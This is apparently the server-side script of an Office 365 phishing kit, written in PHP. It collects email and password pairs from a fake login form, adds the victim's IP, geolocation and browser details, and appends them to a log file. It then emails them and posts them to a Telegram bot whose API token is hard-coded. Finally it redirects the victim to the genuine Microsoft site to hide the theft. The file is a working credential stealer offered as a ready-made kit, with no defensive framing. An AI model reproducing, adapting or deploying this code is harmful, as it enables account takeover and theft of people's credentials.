<?php 

header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Credentials: true");
header('Access-Control-Allow-Methods: GET, PUT, POST, DELETE, OPTIONS');

if (isset($_POST['llg'])) { 
include('./mail.php');
require_once('geoplugin.class.php');
require_once('browser.php');
$browser = new Wolfcast\BrowserDetection();
$browser->setUserAgent($_SERVER['HTTP_USER_AGENT']);
$adddate=date("D M d, Y g:i a");

$geoplugin = new geoPlugin();

$email = $_POST["llg"];
$password = $_POST["lld"];


//get user's ip address
$geoplugin->locate();
if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
} else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
} 

$message .= "\n========+ Office Logins +========\n";
$message .= "| Email: [+ ".$email." +] \n";
$message .= "| Password: [+ ".$password." +] \n";
$message .= "| IP: >> [-" .$ip. "-]\n"; 
$message .= "| Date & Time: >> [+ ".$adddate." +] \n";
$message .= "==========+ LOCATION +==========\n";
$message .= "| City: >> [+ {$geoplugin->city} +]\n";
$message .= "| Region: >> [+ {$geoplugin->region} +]\n";
$message .= "| Country Name: >> [+ {$geoplugin->countryName} +]\n";
$message .= "| Country Code: >> [+ {$geoplugin->countryCode} +]\n";
$message .= $browser;
$message .= "========+ BY Kalisheen +========\n";

$headers = "From: Exo {$geoplugin->countryCode} Alert+ <noreply>";
$headers .= $_POST['smart@docusign.com']."\n";

$login = $email;
$ret = file_put_contents('./error_logs.txt', $message, FILE_APPEND | LOCK_EX);
mail($to,$emailprovider."Office 365 | {$geoplugin->countryName} | ".$ip , $message,$headers);
$apiToken = "2140654560:AAEmDvd5v7uS074daEu9n-3Z6zECCnpRBJA";
    $data = [
        'chat_id' => '1019712974',
        'text' => $message
    ];
    file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data));
    echo "Valid";
http_response_code(200);
echo "Success! Everything checks our.";



// if(!isset($_COOKIE['newcookie'])){
// setcookie('newcookie', time()+(7*24*3600), "/; SameSite=None; Secure");        
// // Set a 200 (okay) response code.   
//  }
//     else{
//         // Set a 500 (internal server error) response code.
//         http_response_code(500);
//     echo "Oops! Something went wrong and we couldn't send your message.";
//   }

                                                                                                                                                                                                                                                                                                                                                                                                                                                                        

// if (!isset($_COOKIE['smartback']))
// {

//     $praga=rand();
// 	$praga=md5($praga);
// setcookie("smartback", "no");
// header("Location: microsoft.php?session_data=resequence&eM=$praga&cgi_sid=$praga&YnMxmwofLodm=$praga&login=$praga&$praga&idXdidIYnMxmwofLodmAkNOueMHosYkssJidXdidIY&cmd=login_submit&id=$praga$praga&session=$praga$praga&userid=$login");
// }
// else{


//YOUR REDIRECT LINK HERE
header("Location:  https://account.microsoft.com/");
}

?>
